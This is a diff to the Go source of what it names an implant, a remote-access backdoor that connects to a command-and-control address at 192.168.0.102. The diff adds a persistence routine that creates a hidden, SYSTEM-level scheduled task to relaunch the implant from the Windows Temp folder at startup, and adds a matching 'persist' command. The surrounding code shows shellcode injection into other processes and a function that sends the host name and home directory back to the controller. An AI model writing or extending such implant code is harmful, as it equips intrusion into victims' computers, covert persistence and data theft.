@@ -211,6 +211,49 @@ func getSC(conn *net.Conn) ([]byte, int) {
 	return sc, 0
 }
 
+func hostinfo(conn net.Conn) bool {
+	hostname, err1 := os.Hostname()
+	user, err2 := os.UserHomeDir()
+
+	if err1 != nil || err2 != nil {
+		log.Println("[-] Error retrieving host info")
+		return false
+	}
+
+	info := hostname + "\n" + user
+	_, err := conn.Write([]byte(info))
+	if err != nil {
+		log.Println("[-] Error writing to connection:", err)
+		return false
+	}
+
+	return true
+}
+
+func persist(conn *net.Conn, taskName string) { //Refine it a bit more
+	//Create Scheduled Task. I had to do it this way since golang tends to mess up cmd.exec sometimes. This is just safer and easier option.
+	command := []string{
+		"/C",
+		"schtasks",
+		"/create",
+		"/tn", taskName,
+		"/sc", "onstart",
+		"/ru", "SYSTEM",
+		"/tr", fmt.Sprintf(`cmd.exe /C C:\Windows\Temp\%s.exe`, taskName),
+	}
+
+	cmd := exec.Command("cmd", command...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	output, err := cmd.CombinedOutput()
+
+	if err != nil {
+		fmt.Println("[-] Failed to create task:", err)
+	}
+	fmt.Println(string(output))
+
+	(*conn).Write([]byte("OK\n"))
+}
+
 func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 	buffer := make([]byte, 4096)
 	for {
@@ -271,33 +314,17 @@ func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 			pidInt, _ := strconv.Atoi(pidString)
 			remoteThread(sc, pidInt)
 
+		case "persist":
+			persist(conn, "5pCi1Mn")
+
 		default:
 			executeCommands(conn, &command)
 		}
 	}
 }
 
-func hostinfo(conn net.Conn) bool {
-	hostname, err1 := os.Hostname()
-	user, err2 := os.UserHomeDir()
-
-	if err1 != nil || err2 != nil {
-		log.Println("[-] Error retrieving host info")
-		return false
-	}
-
-	info := hostname + "\n" + user
-	_, err := conn.Write([]byte(info))
-	if err != nil {
-		log.Println("[-] Error writing to connection:", err)
-		return false
-	}
-
-	return true
-}
-
 func main() {
-	c2Address := "192.168.0.102:1234" // Encrypt/decode at runtime in real use
+	c2Address := "192.168.0.102:4321" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
